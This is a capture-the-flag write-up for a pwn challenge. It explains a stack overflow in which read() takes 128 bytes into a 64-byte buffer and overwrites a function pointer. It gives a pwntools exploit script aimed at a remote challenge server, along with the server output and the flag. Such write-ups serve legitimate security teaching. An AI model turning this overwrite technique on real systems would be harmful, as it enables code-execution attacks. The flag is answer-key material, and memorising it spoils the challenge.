# Writeup
"I trusted the input, it overflowed." A simple function-pointer overwrite.

Looking at `main.c`, `vuln()` has a struct on the stack:

```c
struct {
    char buf[64];
    void (*direction)();
} s;

s.direction = center_of_corn_maze;
read(0, s.buf, 128);     // buf is 64 bytes, but reads 128 -> overflow
s.direction();
```

`buf` is 64 bytes, but `read` takes up to 128 bytes, so we overflow right into the `direction` function pointer that gets called next. There's a `corn_maze_exit()` function that reads `secret.txt` and prints it, which is exactly what we want.

The binary has no canary and no PIE, so it's easy: fill 64 bytes, then overwrite the pointer with the address of `corn_maze_exit`.

```python
from pwn import *
elf = ELF("./main")
r = remote("18.226.103.146", 1337)
r.recvuntil(b"New sign direction: ")
r.sendline(b"A"*64 + p64(elf.symbols['corn_maze_exit']))
r.interactive()
```

Server prints:

```
You've made it out of the maze!
Secret value: br4v3Se@O77er
```

Wrap the secret value in the flag format.

# flag
```
spooky{br4v3Se@O77er}
```
